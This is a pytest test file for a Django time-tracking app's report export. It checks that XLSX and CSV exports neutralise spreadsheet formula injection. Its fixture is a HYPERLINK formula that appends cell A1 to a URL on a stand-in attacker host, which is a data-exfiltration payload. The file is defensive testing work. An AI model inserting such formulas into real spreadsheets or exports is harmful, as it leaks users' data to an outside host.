"""Formel-Einschleusung in den Export (Issue 15)."""

import io
from datetime import timedelta

import pytest
from django.utils import timezone

from apps.reporting import services
from apps.reporting.columns import resolve
from apps.tracking.models import TimeEntry

FORMULA = '=HYPERLINK("http://boese.example/?x"&A1,"Klick")'


@pytest.fixture
def entry_with_formula_note(member, group, activity):
    start = timezone.now().replace(microsecond=0) - timedelta(hours=5)
    return TimeEntry.objects.create(
        user=member,
        group=group,
        activity=activity,
        start=start,
        end=start + timedelta(hours=4),
        note=FORMULA,
    )


def _sheet(rows, columns):
    from openpyxl import load_workbook

    return load_workbook(io.BytesIO(services.to_xlsx(rows, columns))).active


def test_note_stays_text_in_excel(entry_with_formula_note):
    rows = services.build_rows([entry_with_formula_note], "entry")
    sheet = _sheet(rows, resolve(["note"]))

    cell = sheet["A2"]
    assert cell.data_type == "s"
    assert cell.value == FORMULA


def test_numbers_stay_numbers_in_excel(entry_with_formula_note):
    rows = services.build_rows([entry_with_formula_note], "entry")
    sheet = _sheet(rows, resolve(["hours", "date"]))

    assert sheet["A2"].value == 4.0
    assert sheet["A3"].value == 4.0  # Summenzeile
    assert sheet["B2"].value is not None


def test_csv_keeps_its_protection(entry_with_formula_note):
    rows = services.build_rows([entry_with_formula_note], "entry")
    columns = resolve(["note"])

    lines = list(services.to_csv_rows(rows, columns))

    assert lines[1] == ["'" + FORMULA]
